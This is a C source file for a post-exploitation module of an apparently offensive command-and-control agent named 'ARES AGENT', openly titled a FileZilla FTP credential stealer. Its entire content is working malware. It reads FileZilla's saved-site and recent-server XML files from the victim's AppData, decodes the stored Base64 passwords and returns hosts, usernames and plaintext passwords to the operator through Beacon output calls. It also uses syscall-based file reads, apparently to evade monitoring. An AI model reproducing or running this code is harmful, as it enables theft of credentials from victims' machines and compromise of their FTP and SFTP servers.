/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — BOF Module: FileZilla FTP Credential Stealer
 *
 *  Steals saved FTP/SFTP credentials from FileZilla:
 *    - sitemanager.xml (saved sites)
 *    - recentservers.xml (recently connected servers)
 *
 *  Passwords are stored as Base64-encoded plaintext in XML.
 *  No encryption to break — just parse and extract.
 *
 *  Output: JSON array of {host, port, user, password, protocol}
 * ═══════════════════════════════════════════════════════════════
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

/* BeaconAPI compatibility */
extern void BeaconPrintf(int type, const char* fmt, ...);
extern void BeaconOutput(int type, const char* data, int len);

/* Syscall file reader from syscall.c */
extern NTSTATUS Ares_NtCreateFile(void* FileHandle, unsigned long DesiredAccess,
    const char* DosPath, unsigned long ShareAccess, unsigned long CreateDisposition,
    unsigned long CreateOptions);
extern NTSTATUS Ares_NtReadFile(void* FileHandle, void* Buffer, unsigned long Length,
    void* ByteOffset, unsigned long* BytesRead);
extern NTSTATUS Ares_NtQueryInformationFile(void* FileHandle, void* FileSize);
extern NTSTATUS Ares_NtClose(void* Handle);

/* ── Base64 decode (minimal, stack-only) ── */
static int _b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char* src, int src_len, char* dst, int dst_max) {
    int o = 0;
    for (int i = 0; i < src_len && o < dst_max - 1; i += 4) {
        int a = _b64_val(src[i]), b = (i+1 < src_len) ? _b64_val(src[i+1]) : 0;
        int c = (i+2 < src_len) ? _b64_val(src[i+2]) : 0;
        int d = (i+3 < src_len) ? _b64_val(src[i+3]) : 0;
        if (a < 0 || b < 0) break;
        dst[o++] = (char)((a << 2) | (b >> 4));
        if (src[i+2] != '=' && c >= 0 && o < dst_max - 1)
            dst[o++] = (char)(((b & 0x0F) << 4) | (c >> 2));
        if (src[i+3] != '=' && d >= 0 && o < dst_max - 1)
            dst[o++] = (char)(((c & 0x03) << 6) | d);
    }
    dst[o] = '\0';
    return o;
}

/* ── Read file into heap via NtFile syscalls ── */
static char* read_file_to_heap(const char* path, DWORD* out_size) {
    HANDLE hf = NULL;
    NTSTATUS status = Ares_NtCreateFile(&hf, 0x80100000, path, 7, 1, 0x00000060);
    if (status != 0 || !hf) {
        hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hf == INVALID_HANDLE_VALUE) return NULL;
    }
    LARGE_INTEGER fSz; fSz.QuadPart = 0;
    Ares_NtQueryInformationFile(hf, &fSz);
    DWORD sz = (DWORD)fSz.QuadPart;
    if (sz == 0) sz = GetFileSize(hf, NULL);
    if (sz == 0 || sz > 10*1024*1024) { Ares_NtClose(hf); return NULL; }

    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, sz + 1);
    if (!buf) { Ares_NtClose(hf); return NULL; }

    DWORD total = 0;
    while (total < sz) {
        ULONG cr = 0;
        LARGE_INTEGER ro; ro.QuadPart = total;
        ULONG tr = (sz - total > 65536) ? 65536 : (sz - total);
        Ares_NtReadFile(hf, buf + total, tr, &ro, &cr);
        if (cr == 0) break;
        total += cr;
    }
    Ares_NtClose(hf);
    buf[total] = '\0';
    *out_size = total;
    return buf;
}

/* ── Extract XML tag value ── */
static int xml_extract(const char* xml, const char* tag, char* out, int max) {
    char open[64], close[64];
    snprintf(open, sizeof(open), "<%s>", tag);
    snprintf(close, sizeof(close), "</%s>", tag);
    char* start = strstr(xml, open);
    if (!start) return 0;
    start += strlen(open);
    char* end = strstr(start, close);
    if (!end) return 0;
    int len = (int)(end - start);
    if (len >= max) len = max - 1;
    memcpy(out, start, len);
    out[len] = '\0';
    return len;
}

/* ── Parse FileZilla XML and extract servers ── */
static int parse_filezilla_xml(const char* xml, char* json, int json_max) {
    int off = 0;
    int count = 0;
    const char* pos = xml;

    while ((pos = strstr(pos, "<Server>")) != NULL && off < json_max - 512) {
        char* server_end = strstr(pos, "</Server>");
        if (!server_end) break;

        /* Temporary null-terminate this server block */
        int block_len = (int)(server_end - pos + 9);
        char host[256] = {0}, port[16] = {0}, user[256] = {0};
        char pass_b64[512] = {0}, protocol[16] = {0};

        xml_extract(pos, "Host", host, sizeof(host));
        xml_extract(pos, "Port", port, sizeof(port));
        xml_extract(pos, "User", user, sizeof(user));
        xml_extract(pos, "Pass", pass_b64, sizeof(pass_b64));
        xml_extract(pos, "Protocol", protocol, sizeof(protocol));

        /* Decode Base64 password */
        char password[512] = {0};
        if (pass_b64[0]) {
            /* FileZilla stores: encoding="base64" in the Pass tag attribute
             * The actual base64 data might have encoding prefix, skip it */
            char* b64_data = pass_b64;
            /* Check if there's a '>' from attribute parsing leaking */
            char* gt = strchr(b64_data, '>');
            if (gt) b64_data = gt + 1;
            b64_decode(b64_data, (int)strlen(b64_data), password, sizeof(password));
        }

        /* Map protocol number to name */
        const char* proto_name = "FTP";
        if (protocol[0] == '1') proto_name = "SFTP";
        else if (protocol[0] == '3' || protocol[0] == '4') proto_name = "FTPS";

        if (host[0]) {
            if (count > 0) off += snprintf(json + off, json_max - off, ",");
            off += snprintf(json + off, json_max - off,
                "{\"host\":\"%s\",\"port\":\"%s\",\"user\":\"%s\","
                "\"password\":\"%s\",\"protocol\":\"%s\"}",
                host, port[0] ? port : "21", user, password, proto_name);
            count++;
        }

        pos = server_end + 9;
    }
    return count;
}

/* ═══════════════════════════════════════════════════════
 *  BOF ENTRY POINT — Called by Ares BOF Loader
 * ═══════════════════════════════════════════════════════ */
void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    char appdata[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0) {
        BeaconPrintf(0, "ERROR: cannot get APPDATA");
        return;
    }

    char json_buf[32768];
    int off = 0;
    int total = 0;
    off += snprintf(json_buf + off, sizeof(json_buf) - off,
        "{\"type\":\"ftp_credentials\",\"source\":\"FileZilla\",\"servers\":[");

    /* Files to check */
    const char* files[] = { "sitemanager.xml", "recentservers.xml", NULL };

    for (int f = 0; files[f]; f++) {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\FileZilla\\%s", appdata, files[f]);

        DWORD sz = 0;
        char* xml = read_file_to_heap(path, &sz);
        if (!xml) continue;

        int count = parse_filezilla_xml(xml, json_buf + off, sizeof(json_buf) - off);
        total += count;
        off = (int)strlen(json_buf); /* Update offset after parsing */

        /* Secure wipe */
        memset(xml, 0, sz);
        HeapFree(GetProcessHeap(), 0, xml);
    }

    off += snprintf(json_buf + off, sizeof(json_buf) - off,
        "],\"total\":%d}", total);

    BeaconOutput(0, json_buf, off);
    BeaconPrintf(0, "\n[+] FileZilla steal complete: %d servers", total);
}
